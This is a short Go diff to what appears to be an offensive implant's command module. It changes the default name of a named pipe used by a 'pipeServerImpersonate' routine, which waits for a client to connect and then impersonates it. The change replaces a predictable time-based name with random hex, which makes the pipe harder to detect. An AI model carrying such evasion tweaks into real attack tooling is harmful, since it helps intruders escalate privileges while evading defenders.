@@ -4,11 +4,12 @@
 package commands
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
-	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -150,7 +151,9 @@ func pipeServerCheck(task structs.Task) structs.CommandResult {
 // pipeServerImpersonate creates a named pipe, waits for connection, and impersonates
 func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.CommandResult {
 	if args.Name == "" {
-		args.Name = fmt.Sprintf("svc_%d", time.Now().UnixNano()%100000)
+		var rb [4]byte
+		_, _ = rand.Read(rb[:])
+		args.Name = hex.EncodeToString(rb[:])
 	}
 
 	pipePath := fmt.Sprintf(`\\.\pipe\%s`, args.Name)
